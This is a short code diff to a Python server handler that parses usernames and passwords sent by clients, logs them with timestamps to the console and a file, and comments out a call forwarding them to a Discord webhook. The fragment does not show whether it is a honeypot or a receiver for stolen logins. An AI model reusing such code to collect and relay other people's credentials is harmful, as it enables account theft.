@@ -20,10 +20,10 @@ def handle_client(conn, addr):
         username = strData[2:strData.find(':')]
     password = strData[strData.find(':')+1:strData.find(';end')]
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
-    storage = f"\nTimestamp: {timestamp}\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
+    storage = f"\nTimestamp: {timestamp}\nSource: {addr[0]}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
 
-    discordWH(addr, username, password)
+    # discordWH(addr[0], username, password)
 
     writeFile(storage, addr)
 
